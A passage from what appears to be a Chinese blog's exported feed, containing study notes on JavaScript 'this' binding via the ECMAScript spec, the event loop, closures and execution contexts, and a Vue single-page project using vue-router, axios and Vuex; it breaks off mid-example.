    <content type="text"><![CDATA[说起JavaScript中的 this ，一直是一个非常让人头痛的东西，我们常会见到相关书籍和文章中用这样一句话来概括 this 的指向。 this 为引用函数当前执行的环境对象。 然而这样的描述却十分的抽象，最近拜读了某位大佬从ECMAScript规范对this的解读，有一种豁然开朗的感觉，本文更像是一篇笔记，里面也包含了一些我对this的理解，供分享学习。 Types Types are further subclassified into ECMAScript language types and specification types.An ECMAScript language type corresponds to values that are directly manipulated by an ECMAScript programmer using the ECMAScript language. The ECMAScript language types are Undefined, Null, Boolean, String, Number, and Object.A specification type corresponds to meta-values that are used within algorithms to describe the semantics of ECMAScript language constructs and ECMAScript language types. The specification types are Reference, List, Completion, Property Descriptor, Property Identifier, Lexical Environment, and Environment Record. ECMAScript 的类型分为语言类型和规范类型。ECMAScript 语言类型是开发者直接使用 ECMAScript 可以操作的。其实就是我们常说的Undefined, Null, Boolean, String, Number, 和 Object。而规范类型相当于 meta-values，是用来用算法描述 ECMAScript 语言结构和 ECMAScript 语言类型的。规范类型包括：Reference, List, Completion, Property Descriptor, Property Identifier, Lexical Environment, 和 Environment Record。 ReferenceReference 是一个 Specification Type，也就是 “只存在于规范里的抽象类型”。它们是为了更好地描述语言的底层行为逻辑才存在的，但并不存在于实际的 js 代码中。 A Reference is a resolved name binding.A Reference consists of three components, the base value, the referenced name and the Boolean valued strict reference flag.The base value is either undefined, an Object, a Boolean, a String, a Number, or an environment record (10.2.1).A base value of undefined indicates that the reference could not be resolved to a binding. The referenced name is a String. 这段讲述了 Reference 的构成，由三个组成部分，分别是： base value：就是属性所在的对象或者就是 EnvironmentRecord，它的值只可能是 undefined, an Object, a Boolean, a String, a Number, or an environment record 其中的一种。 referenced name：就是属性的名称。 strict reference 12345678910111213141516171819202122232425//示例1var foo = 1;// 对应的Reference是：var fooReference = &#123; base: EnvironmentRecord, name: &apos;foo&apos;, strict: false&#125;;//示例2var foo = &#123; bar: function () &#123; return this; &#125;&#125;;foo.bar(); // foo// bar对应的Reference是：var BarReference = &#123; base: foo, propertyName: &apos;bar&apos;, strict: false&#125;; 规范中还提供了获取 Reference 组成部分的方法，比如 GetBase 和 IsPropertyReference。 GetBase GetBase(V). Returns the base value component of the reference V. 返回 reference 的 base value。 IsPropertyReference IsPropertyReference(V). Returns true if either the base value is an object or HasPrimitiveBase(V) is true; otherwise returns false. 简单的理解：如果 base value 是一个对象，就返回true。 GetValueGetValue 返回对象属性真正的值。123456789var foo = 1;var fooReference = &#123; base: EnvironmentRecord, name: &apos;foo&apos;, strict: false&#125;;GetValue(fooReference) // 1; MemberExpression PrimaryExpression // 原始表达式 可以参见《JavaScript权威指南第四章》 FunctionExpression // 函数定义表达式 MemberExpression [ Expression ] // 属性访问表达式 MemberExpression . IdentifierName // 属性访问表达式 new MemberExpression Arguments // 对象创建表达式 123456789101112131415161718192021function foo() &#123; console.log(this)&#125;foo(); // MemberExpression 是 foofunction foo() &#123; return function() &#123; console.log(this) &#125;&#125;foo()(); // MemberExpression 是 foo()var foo = &#123; bar: function () &#123; return this; &#125;&#125;foo.bar(); // MemberExpression 是 foo.bar 所以简单理解 MemberExpression 其实就是()左边的部分。 this 的确定步骤 计算 MemberExpression 的结果赋值给 ref 判断 ref 是不是一个 Reference 类型 如果 ref 是 Reference，并且 IsPropertyReference(ref) 是 true, 那么 this 的值为 GetBase(ref) 如果 ref 是 Reference，并且 base value 值是 Environment Record, 那么this的值为 ImplicitThisValue(ref) 如果 ref 不是 Reference，那么 this 的值为 undefined 案例分析12345678910111213141516171819var value = 1;var foo = &#123; value: 2, bar: function () &#123; return this.value; &#125;&#125;//示例1console.log(foo.bar());//示例2console.log((foo.bar)());//示例3console.log((foo.bar = foo.bar)());//示例4console.log((false || foo.bar)());//示例5console.log((foo.bar, foo.bar)()); foo.bar() 判断MemberExpression 计算结果为 foo.bar foo.bar的Reference 12345var Reference = &#123; base: foo, name: &apos;bar&apos;, strict: false&#125;; IsPropertyReference(ref) 是 true 返回GetBase()，为 foo (foo.bar)() () 并没有对 MemberExpression 进行计算 判断MemberExpression 计算结果为 foo.bar foo.bar的Reference 12345var Reference = &#123; base: foo, name: &apos;bar&apos;, strict: false&#125;; IsPropertyReference(ref) 是 true 返回GetBase()，为 foo (foo.bar = foo.bar)() 关于赋值运算符 = ，使用了 GetValue 进行赋值，所以返回值不为 Reference 类型 this 为 undefined 非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象 (false || foo.bar)() 关于逻辑运算符，使用了 GetValue 进行求值，所以返回值不为 Reference 类型 this 为 undefined 非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象 (foo.bar, foo.bar)() 关于逗号运算符，使用了 GetValue 进行运算，所以返回值不为 Reference 类型 this 为 undefined 非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象 最终结果123456789101112131415161718192021var value = 1;var foo = &#123; value: 2, bar: function () &#123; return this.value; &#125;&#125;//示例1console.log(foo.bar()); // 2//示例2console.log((foo.bar)()); // 2//示例3console.log((foo.bar = foo.bar)()); // 1//示例4console.log((false || foo.bar)()); // 1//示例5console.log((foo.bar, foo.bar)()); // 1//示例6 补充12345function foo() &#123; console.log(this)&#125;foo(); MemberExpression 是 foo foo 的 Reference 12345var fooReference = &#123; base: EnvironmentRecord, name: &apos;foo&apos;, strict: false&#125;; base value 是 Environment Record，调用 ImplicitThisValue(ref) ImplicitThisValue 方法始终返回 undefined。 改变this指向箭头函数箭头函数的 this 始终指向函数定义时的 this，而非执行时。箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined。1234567891011121314151617var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( () =&gt; &#123; this.func1() &#125;,100); &#125;&#125;;a.func2() // Cherry 在函数内部使用 _this = this利用 _this 保存 this 对象。12345678910111213141516171819var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; var _this = this; setTimeout( function() &#123; _this.func1() &#125;,100); &#125;&#125;;a.func2() // Cherry 使用 apply、call、bindapply12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.apply(a),100); &#125;&#125;;a.func2() // Cherry call12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.call(a),100); &#125;&#125;;a.func2() // Cherry bind12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.bind(a)(),100); &#125;&#125;;a.func2() // Cherry apply、call、bind 区别apply 和 call 的区别apply 和 call 基本类似，他们的区别只是传入的参数不同。 apply 的语法为：1fun.apply(thisArg, [argsArray]) call 的语法为：1fun.call(thisArg[, arg1[, arg2[, ...]]]) bind 和 apply、call 区别bind 是创建一个新的函数，我们必须要手动去调用123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.bind(a,1,2)() // 3 参考链接：JavaScript深入系列15篇（冴羽）]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript执行机制]]></title>
    <url>%2FJavaScript%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6.html</url>
    <content type="text"><![CDATA[众所周知，JavaScript是一门单线程语言，但这并不意味着JavaScript会逐行执行，因为JS中有诸如 setTimeout , Promise 这类语法的存在，所以JS得执行顺序便变得扑朔迷离起来，本文就从JS的执行机制一起来探究JS的执行顺序。 同步和异步因为JavaScript时单线程语言，所以JS的任务需要一个个顺序执行。但当我们的页面需要请求文件、图片等耗时较久的操作时，显然一个个执行，将影响页面的渲染和用户体验，所以我们提出了两个概念：同步任务 和 异步任务 。 同步任务定义：如果在函数A返回的时候，调用者就能够得到预期结果(即拿到了预期的返回值或者看到了预期的效果)，那么这个函数就是同步的。1console.log(&quot;Hi&quot;); 异步任务定义：如果在函数A返回的时候，调用者还不能够得到预期结果，而是需要在将来通过一定的手段得到，那么这个函数就是异步的。123fs.readFile(&apos;foo.txt&apos;, &apos;utf8&apos;, function(err, data) &#123; console.log(data);&#125;); 事件循环在我们了解了同步任务和异步任务后，我们来看看他们具体是如何执行的。 同步和异步任务分别进入不同的执行”场所”，同步的进入主线程，异步的进入Event Table并注册函数。 当指定的事情完成时，Event Table会将这个函数移入Event Queue。 主线程内的任务执行完毕为空，会去Event Queue读取对应的函数，进入主线程执行。 上述过程会不断重复，也就是常说的Event Loop(事件循环)。 js引擎存在monitoring process进程，会持续不断的检查主线程执行栈是否为空，一旦为空，就会去Event Queue那里检查是否有等待被调用的函数。123456789let data = [];$.ajax(&#123; url:www.javascript.com, data:data, success:() =&gt; &#123; console.log(&apos;发送成功!&apos;); &#125;&#125;)console.log(&apos;代码执行结束&apos;); ajax进入Event Table，注册回调函数success。 执行console.log(‘代码执行结束’)。 ajax事件完成，回调函数success进入Event Queue。 主线程从Event Queue读取回调函数success并执行。 setTimeoutsetTimeout 函数常用于延时执行。1234567setTimeout(() =&gt; &#123; task();&#125;,3000)console.log(&apos;执行console&apos;);//执行console//3秒后，执行task() 而有时候，setTimeout 的延时时间会超出我们设定的时间，这是因为JS的同步任务可能占用了大量时间，setTimeout 得等到同步任务执行完毕后才能执行。12345setTimeout(() =&gt; &#123; task()&#125;,3000)sleep(10000000); task()进入Event Table并注册,计时开始。 执行sleep函数，很慢，非常慢，计时仍在继续。 3秒到了，计时事件timeout完成，task()进入Event Queue，但是sleep也太慢了吧，还没执行完，只好等着。 sleep终于执行完了，task()终于从Event Queue进入了主线程执行。 所以由上可知， setTimeout(fn,0) 的含义是指定某个任务在主线程最早可得的空闲时间执行。 setInterval setInterval 与 setTimeout 相近，setInterval 会每隔指定的时间将注册的函数置入Event Queue，如果前面的任务耗时太久，同样需要等待。 对于setInterval(fn,ms)来说，我们已经知道不是每过ms秒会执行一次fn，而是每过ms秒，会有fn进入Event Queue。一旦setInterval的回调函数fn执行时间超过了延迟时间ms，那么就完全看不出来有时间间隔了。 process.nextTick(callback)process.nextTick(callback)类似node.js版的”setTimeout”，在事件循环的下一次循环中调用 callback 回调函数。 宏任务和微任务除了广义的同步任务和异步任务，我们对任务有更精细的定义： macro-task(宏任务)：包括整体代码script，setTimeout，setInterval micro-task(微任务)：Promise，process.nextTick 不同类型的任务会进入对应的Event Queue，比如setTimeout和setInterval会进入相同的Event Queue。 事件循环的顺序，决定js代码的执行顺序。进入整体代码(宏任务)后，开始第一次循环。接着执行所有的微任务。然后再次从宏任务开始，找到其中一个任务队列执行完毕，再执行所有的微任务。 1234567891011setTimeout(function() &#123; console.log(&apos;setTimeout&apos;);&#125;)new Promise(function(resolve) &#123; console.log(&apos;promise&apos;);&#125;).then(function() &#123; console.log(&apos;then&apos;);&#125;)console.log(&apos;console&apos;); 这段代码作为宏任务，进入主线程。 先遇到setTimeout，那么将其回调函数注册后分发到宏任务Event Queue。(注册过程与上同，下文不再描述) 接下来遇到了Promise，new Promise立即执行，then函数分发到微任务Event Queue。 遇到console.log()，立即执行。 整体代码script作为第一个宏任务执行结束，看看有哪些微任务？我们发现了then在微任务Event Queue里面，执行。 第一轮事件循环结束了，我们开始第二轮循环，当然要从宏任务Event Queue开始。我们发现了宏任务Event Queue中setTimeout对应的回调函数，立即执行。 结束。 复杂案例123456789101112131415161718192021222324252627282930313233343536console.log(&apos;1&apos;);setTimeout(function() &#123; console.log(&apos;2&apos;); process.nextTick(function() &#123; console.log(&apos;3&apos;); &#125;) new Promise(function(resolve) &#123; console.log(&apos;4&apos;); resolve(); &#125;).then(function() &#123; console.log(&apos;5&apos;) &#125;)&#125;)process.nextTick(function() &#123; console.log(&apos;6&apos;);&#125;)new Promise(function(resolve) &#123; console.log(&apos;7&apos;); resolve();&#125;).then(function() &#123; console.log(&apos;8&apos;)&#125;)setTimeout(function() &#123; console.log(&apos;9&apos;); process.nextTick(function() &#123; console.log(&apos;10&apos;); &#125;) new Promise(function(resolve) &#123; console.log(&apos;11&apos;); resolve(); &#125;).then(function() &#123; console.log(&apos;12&apos;) &#125;)&#125;) 第一轮事件循环流程分析如下： 整体script作为第一个宏任务进入主线程，遇到console.log，输出1。 遇到setTimeout，其回调函数被分发到宏任务Event Queue中。我们暂且记为setTimeout1。 遇到process.nextTick()，其回调函数被分发到微任务Event Queue中。我们记为process1。 遇到Promise，new Promise直接执行，输出7。then被分发到微任务Event Queue中。我们记为then1。 又遇到了setTimeout，其回调函数被分发到宏任务Event Queue中，我们记为setTimeout2。 宏任务Event Queue 微任务Event Queue setTimeout1 process1 setTimeout2 then1 上表是第一轮事件循环宏任务结束时各Event Queue的情况，此时已经输出了1和7。 我们发现了process1和then1两个微任务。 执行process1,输出6。 执行then1，输出8。 第二轮时间循环从setTimeout1宏任务开始： 首先输出2。接下来遇到了process.nextTick()，同样将其分发到微任务Event Queue中，记为process2。new Promise立即执行输出4，then也分发到微任务Event Queue中，记为then2。 宏任务Event Queue 微任务Event Queue setTimeout2 process2 then2 第二轮事件循环宏任务结束，我们发现有process2和then2两个微任务可以执行。 输出3。 输出5。 第二轮事件循环结束，第二轮输出2，4，3，5。 第三轮事件循环开始，此时只剩setTimeout2了，执行。 直接输出9。 将process.nextTick()分发到微任务Event Queue中。记为process3。 直接执行new Promise，输出11。 将then分发到微任务Event Queue中，记为then3。 宏任务Event Queue 微任务Event Queue process3 then3 第三轮事件循环宏任务执行结束，执行两个微任务process3和then3。 输出10。 输出12。 第三轮事件循环结束，第三轮输出9，11，10，12。 整段代码，共进行了三次事件循环，完整的输出为1，7，6，8，2，4，3，5，9，11，10，12。 总结以上就是JavaScript的执行机制，最后在强调一下JavaScript的两个基本特征。 javascript是一门单线程语言 Event Loop是javascript的执行机制 参考链接：这一次，彻底弄懂 JavaScript 执行机制（ssssyoki）]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从执行上下文深入理解闭包]]></title>
    <url>%2F%E4%BB%8E%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85.html</url>
    <content type="text"><![CDATA[在学习前端的道路上，对很多知识点我们大多时候都是知其然而不知其所以然，当我们钻牛角尖去研究那些底层原理的时候，我们又容易迷失方向，不禁发出灵魂的拷问——“这个知识究竟有什么用处”，在拜读了某位大佬JS深入学习系列的专题文章后，我不由想要从其底层原理来讲讲闭包的实现过程，以此对闭包有更深入的理解。 1234567891011var scope = &quot;global scope&quot;;function checkscope()&#123; var scope = &quot;local scope&quot;; function f()&#123; return scope; &#125; return f;&#125;var foo = checkscope();foo(); 首先，我们以上面这段代码，来看下其执行上下文的构建过程。 执行上下文构建过程执行全局代码，创建全局执行上下文，全局上下文被压入执行上下文栈。123ECStack = [ globalContext]; 全局上下文初始化。12345globalContext = &#123; VO: [global, scope, checkscope, foo], Scope: [globalContext.VO], this: globalContext.VO&#125; 初始化的同时，checkscope 函数被创建，保存作用域链到函数的内部属性[[scope]]。123checkscope.[[scope]] = [ globalContext.VO]; 执行 checkscope 函数，创建 checkscope 函数执行上下文，checkscope 函数执行上下文被压入执行上下文栈。1234ECStack = [ checkscopeContext, globalContext]; checkscope 函数执行上下文初始化： 复制函数 [[scope]] 属性创建作用域链， 用 arguments 创建活动对象， 初始化活动对象，即加入形参、函数声明、变量声明， 将活动对象压入 checkscope 作用域链顶端。 f 函数被创建，保存作用域链到 f 函数的内部属性[[scope]] 1234567891011checkscopeContext = &#123; AO: &#123; arguments: &#123; length: 0 &#125;, scope: undefined, f: reference to function f()&#123;&#125; &#125;, Scope: [AO, globalContext.VO], this: undefined&#125; checkscope 函数执行完毕，checkscope 执行上下文从执行上下文栈中弹出123ECStack = [ globalContext]; 执行 f 函数，创建 f 函数执行上下文，f 执行上下文被压入执行上下文栈。1234ECStack = [ fContext, globalContext]; f 函数执行上下文初始化, 以下跟第 4 步相同： 复制函数 [[scope]] 属性创建作用域链 用 arguments 创建活动对象 初始化活动对象，即加入形参、函数声明、变量声明 将活动对象压入 f 作用域链顶端 123456789fContext = &#123; AO: &#123; arguments: &#123; length: 0 &#125; &#125;, Scope: [AO, checkscopeContext.AO, globalContext.VO], this: undefined&#125; f 函数执行，沿着作用域链查找 scope 值，返回 scope 值。f 函数执行完毕，f 函数上下文从执行上下文栈中弹出。123ECStack = [ globalContext]; 闭包的定义现在我们再来看看 ECMAScript 中对闭包的定义。 理论角度所有的函数。因为它们都在创建的时候就将上层上下文的数据保存起来了。哪怕是简单的全局变量也是如此，因为函数中访问全局变量就相当于是在访问自由变量，这个时候使用最外层的作用域。 实践角度以下函数才算是闭包： 即使创建它的上下文已经销毁，它仍然存在（比如，内部函数从父函数中返回）。 在代码中引用了自由变量。 所以可见 f 的执行上下文维护了一个作用域链。123fContext = &#123; Scope: [AO, checkscopeContext.AO, globalContext.VO]&#125; 在 checkscopeContext 被销毁的情况下，该作用域链依旧被保存了下来，形成了闭包。 经典闭包例子分析1234567891011var data = [];for (var i = 0; i &lt; 3; i++) &#123; data[i] = function () &#123; console.log(i); &#125;;&#125;data[0](); //3data[1](); //3data[2](); //3 当执行到 data[0] 函数之前，此时全局上下文的 VO 为：123456globalContext = &#123; VO: &#123; data: [...], i: 3 &#125;&#125; 当执行 data[0] 函数的时候，data[0] 函数的作用域链为：123data[0]Context = &#123; Scope: [AO, globalContext.VO]&#125; data[0]Context 的 AO 并没有 i 值，所以会从 globalContext.VO 中查找，i 为 3，所以打印的结果就是 3。 12345678910111213var data = [];for (var i = 0; i &lt; 3; i++) &#123; data[i] = (function (i) &#123; return function()&#123; console.log(i); &#125; &#125;)(i);&#125;data[0](); //0data[1](); //1data[2](); //2 当执行到 data[0] 函数之前，此时全局上下文的 VO 为：123456globalContext = &#123; VO: &#123; data: [...], i: 3 &#125;&#125; 当执行 data[0] 函数的时候，data[0] 函数的作用域链发生了改变：123data[0]Context = &#123; Scope: [AO, 匿名函数Context.AO globalContext.VO]&#125; 匿名函数执行上下文的 AO 为：123456789匿名函数Context = &#123; AO: &#123; arguments: &#123; 0: 0, length: 1 &#125;, i: 0 &#125;&#125; data[0]Context 的 AO 并没有 i 值，所以会沿着作用域链从匿名函数 Context.AO 中查找，这时候就会找 i 为 0，找到了就不会往 globalContext.VO 中查找了，即使 globalContext.VO 也有 i 的值(值为3)，所以打印的结果就是 0。 总结以上就是对闭包的理解，那么学会了闭包，对我们的日常开发有什么用处呢，闭包在实际应用中最多的，就是用来实现函数柯里化，有关函数柯里化的知识可以参考我的另一篇文章函数柯里化 参考链接：JavaScript深入系列15篇（冴羽）]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue去哪儿项目学习笔记]]></title>
    <url>%2Fvue%E5%8E%BB%E5%93%AA%E5%84%BF%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[借着每天零碎的时间，终于跟着某课网的视频完成了vue仿去哪儿的小项目，通过这个项目的练手，对vue和组件化开发有了更深入的理解，本文就来梳理下整个项目开发中那些值得思考和学习的知识。 项目启动流程 多页应用 vs 单页应用多页应用 解释：页面跳转，返回一个新的HTML文件 优点：首屏时间快，SEO效果好 缺点：页面切换慢 单页应用 解释：页面跳转，通过JS动态删除页面内容，再重新渲染 优点：页面切换快 缺点：首屏时间慢，SEO差 Fast Click 作用解决移动端点击300ms延迟的问题。 产生原因移动浏览器上支持的双击缩放操作，以及IOS Safari 上的双击滚动操作，是导致300ms的点击延迟主要原因。 原理FastClick的实现原理是在检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并把浏览器在300ms之后真正的click事件阻止掉。 使用12345npm install fastclick --save//main.jsimport fastClick from &apos;fastclisk&apos;fastClick.attach(document.body) 不需要使用FastClick的情况 FastClick是不会对PC浏览器添加监听事件 Android版Chrome 32+浏览器，如果设置viewport meta的值为width=device-width，这种情况下浏览器会马上出发点击事件，不会延迟300毫秒。 所有版本的Android Chrome浏览器，如果设置viewport meta的值有user-scalable=no，浏览器也是会马上出发点击事件。 IE11+浏览器设置了css的属性touch-action: manipulation，它会在某些标签（a，button等）禁止双击事件，IE10的为-ms-touch-action: manipulation Stylus 依赖包 使用方式1234npm install stylus --savenpm install stylus-loader --save&lt;style lang=&quot;stylus&quot; scoped&gt;&lt;/style&gt; 优点 可以使用缩进实现样式嵌套 可以使用变量 可以使用混合 vue-awesome-swiper 依赖包 安装1npm install vue-awesome-swiper@2.6.7 --save 使用12345//main.jsimport VueAwesomeSwiper from &apos;vue-awesome-swiper&apos;import &apos;swiper/dist/css/swiper.css&apos;Vue.use(VueAwesomeSwiper) 常用参数 Parameter Type Default Description direction string ‘horizontal’ Could be ‘horizontal’ or ‘vertical’ (for vertical slider) speed number 300 Duration of transition between slides (in ms) loop boolean false Set to true to enable continuous loop mode 常用组件12345pagination: &#123; el: &apos;.swiper-pagination&apos;, type: &apos;bullets&apos; //Can be &quot;bullets&quot;, &quot;fraction&quot;, &quot;progressbar&quot; or &quot;custom&quot;&#125; 优化 当 swiper 包裹的元素为图片时，为了防止图片加载较慢导致的回流 (reflow) 现象，建议在 swiper 外加一层 div ，并提前为其设置宽高。 为了防止渲染的顺序与请求返回的数组顺序不一致，可以添加 v-if 条件，设置请求获得返回值时再进行页面渲染。 12345678910111213141516&lt;div class=&quot;wrapper&quot;&gt; &lt;swiper :options=&quot;swiperOption&quot; v-if=&quot;showSwiper&quot;&gt; &lt;!-- slides --&gt; &lt;swiper-slide v-for=&quot;item of list&quot; :key=&quot;item.id&quot;&gt; &lt;img class=&quot;swiper-img&quot; :src=&quot;item.imgUrl&quot; /&gt; &lt;/swiper-slide&gt; &lt;!-- Optional controls --&gt; &lt;div class=&quot;swiper-pagination&quot; slot=&quot;pagination&quot;&gt;&lt;/div&gt; &lt;/swiper&gt;&lt;/div&gt;.wrapper width: 100% height: 0 overflow: hidden padding-bottom: 26.5% 注意点当 swpier 包裹元素几期父元素存在隐藏后显示情况时，会导致 swiper 计算出错，为了解决这一问题可以在 swiperOptions 里添加两个属性。123456swiperOption: &#123; pagination: &apos;.swiper-pagination&apos;, paginationType: &apos;fraction&apos;, observeParents: true, observer: true&#125; 只要监听到该元素或其父元素DOM发生了变化，就会刷新页面，重新计算。 Axios 获取数据安装1npm install axios --save 使用方法123456789101112131415161718192021222324252627282930import axios from &apos;axios&apos;data () &#123; return &#123; lastCity: &apos;&apos;, swiperList: [], iconList: [], recommendList: [], weekendList: [] &#125;&#125;,methods: &#123; getHomeInfo () &#123; axios.get(&apos;/api/index.json&apos;).then(this.getHomeInfoSucc) &#125;, getHomeInfoSucc (res) &#123; res = res.data if (res.ret &amp;&amp; res.data) &#123; const data = res.data this.swiperList = data.swiperList this.iconList = data.iconList this.recommendList = data.recommendList this.weekendList = data.weekendList &#125; console.log(res) &#125; &#125;, mounted () &#123; this.getHomeInfo() &#125; 在开发环境，可以模拟从后端返回的json数据，在 static/mock/ 目录下放模拟的 JSON 文件。并在 config/index.js -&gt; ProxyTable 中配置映射路径。 12345678proxyTable: &#123; &apos;/api&apos;: &#123; target: &apos;http://localhost:8080&apos;, pathRewrite: &#123; &apos;^/api&apos;: &apos;/static/mock&apos; &#125; &#125;&#125; vue-router解释单页面复应用 (SPA) 的核心就是前端路由。路由切换时，切换的是 &lt;router-view&gt; 挂载的组件，其他内容不会变化。 安装1234npm install vue-router --saveimport VueRouter from &apos;vue-router&apos;Vue.use(VueRouter) 基本使用123456789&lt;router-link to=&quot;/&quot;&gt;Go to Home&lt;/router-link&gt;routes: [ &#123; path: &apos;/&apos;, name: &apos;Hello&apos;, component: Hello &#125;] 动态路由匹配我们经常需要把某种模式匹配到的所有路由，全都映射到同个组件。1234567routes: [ &#123; path: &apos;/detail/:id&apos;, name: &apos;Detail&apos;, component: Detail &#125;], 一个“路径参数”使用冒号 : 标记。当匹配到一个路由时，参数值会被设置到 this.$route.params123params: &#123; id: this.$route.params.id&#125; 当使用路由参数时，例如从 /user/foo 导航到 /user/bar，原来的组件实例会被复用，这意味着组件的生命周期钩子不会再被调用。 复用组件时，想对路由参数的变化作出响应的话，你可以简单地 watch (监测变化) $route 对象。12345678const User = &#123; template: &apos;...&apos;, watch: &#123; &apos;$route&apos; (to, from) &#123; // 对路由变化作出响应... &#125; &#125;&#125; 有时候，同一个路径可以匹配多个路由，此时，匹配的优先级就按照路由的定义顺序：谁先定义的，谁的优先级就最高。 编程式的导航除了使用 &lt;router-link&gt; 创建 a 标签来定义导航链接，我们还可以借助 router 的实例方法，通过编写代码来实现。 router.push(location, onComplete?, onAbort?) router.replace(location, onComplete?, onAbort?) router.go(n) 导航守卫导航守卫主要用来通过跳转或取消的方式守卫导航。有多种机会植入路由导航过程中：全局的, 单个路由独享的, 或者组件级的。 全局前置守卫当一个导航触发时，全局前置守卫按照创建顺序调用。1234//main.jsrouter.beforeEach((to, from, next) =&gt; &#123; // ...&#125;) 每个守卫方法接收三个参数： to: Route: 即将要进入的目标 路由对象 from: Route: 当前导航正要离开的路由 next: Function: 一定要调用该方法来 resolve 这个钩子。 全局后置钩子123router.afterEach((to, from) =&gt; &#123; // ...&#125;) 路由独享的守卫1234567891011const router = new VueRouter(&#123; routes: [ &#123; path: &apos;/foo&apos;, component: Foo, beforeEnter: (to, from, next) =&gt; &#123; // ... &#125; &#125; ]&#125;) 组件内的守卫 beforeRouteEnter beforeRouteUpdate (2.2 新增) beforeRouteLeave 完整的导航解析流程 导航被触发。 在失活的组件里调用 beforeRouteLeave 离开守卫。 调用全局的 beforeEach 守卫。 在重用的组件里调用 beforeRouteUpdate 守卫 (2.2+)。 在路由配置里调用 beforeEnter。 解析异步路由组件。 在被激活的组件里调用 beforeRouteEnter。 调用全局的 beforeResolve 守卫 (2.5+)。 导航被确认。 调用全局的 afterEach 钩子。 触发 DOM 更新。 用创建好的实例调用 beforeRouteEnter 守卫中传给 next 的回调函数。 滚动行为使用前端路由，当切换到新路由时，想要页面滚到顶部，或者是保持原先的滚动位置，就像重新加载页面那样。 vue-router 能做到，而且更好，它让你可以自定义路由切换时页面如何滚动。1234567scrollBehavior (to, from, savedPosition) &#123; if (savedPosition) &#123; return savedPosition &#125; else &#123; return &#123; x: 0, y: 0 &#125; &#125;&#125; better-scroll 依赖包安装使用123456npm install better-scroll --saveimport BScroll from &apos;better-scroll&apos;mounted () &#123; this.scroll = new Bscroll(this.$refs.wrapper, &#123; mouseWheel: true, click: true, tap: true &#125;)&#125; 常用参数 startX: 0 (默认值:0) 表示X轴滚动的起始值 startY: 0 (默认值:0) 表示Y轴滚动的起始值 scrollY: false (默认值:false) 表示延Y轴滚动 scrollX: true (默认值:true) 表示延X轴滚动 freeScroll: false (默认值:false) 自由方向滚动 scrollbar: false (默认值:false) 滚动条 click: false (默认值:false) better-scroll 默认会阻止浏览器的原生 click 事件。当设置为 true，better-scroll 会派发一个 click 事件 tap: false (默认值:false) better-scroll 会阻止原生的 click 事件，我们可以设置 tap 为 true，它会在区域被点击的时候派发一个 tap 事件 mouseWheel: false (默认值:false) 这个配置用于 PC 端的鼠标滚轮，默认为 false 。当设置为 true 或者是一个 Object 的时候，可以开启鼠标滚轮 常用方法refresh()重新计算 better-scroll，当 DOM 结构发生变化的时候务必要调用确保滚动的效果正常 scrollTo(x, y, time, easing)滚动到指定的位置; x: X轴位置; y: Y轴位置; time: 到达指定位置所需时间，单位ms; easing: 动画函数(一般不建议修改) scrollBy(x, y, time, easing)相对于当前位置偏移滚动 x,y 的距离； x: 当前位置偏移X轴的距离 y: 当前位置偏移Y轴的距离 time: 到达偏移位置所需时间，单位ms; easing: 动画函数(一般不建议修改) scrollToElement(el, time, offsetX, offsetY, easing)滚动到指定的目标元素 el: 目标元素; time: 到达目标元素所需时间，单位ms; offsetX: 距离目标元素所偏移X轴的距离;设置为true时，到达目标元素中心位置 offsetY: 距离目标元素所偏移Y轴的距离;设置为true时，到达目标元素中心位置 easing: 动画函数(一般不建议修改) vuex 实现数据共享安装配置12345npm install vuex --save//main.jsimport Vuex from &apos;vuex&apos;Vue.use(Vuex) 解释Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。Vuex 解决了以下问题： 多个视图依赖于同一状态。 来自不同视图的行为需要变更同一状态。 下图为 vuex 工作流程: 使用每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的状态 (state)。12345678910const store = new Vuex.Store(&#123; state: &#123; count: 0 &#125;, mutations: &#123; increment (state) &#123; state.count++ &#125; &#125;&#125;) 核心概念State由于 Vuex 的状态存储是响应式的，从 store 实例中读取状态最简单的方法就是在计算属性中返回某个状态。每当 this.$store.state.count 变化的时候, 都会重新求取计算属性，并且触发更新相关联的 DOM。12345678const Counter = &#123; template: `&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;`, computed: &#123; count () &#123; return this.$store.state.count &#125; &#125;&#125; 可以使用 mapState 辅助函数帮助我们生成计算属性。12345import &#123; mapState &#125; from &apos;vuex&apos;computed: &#123; 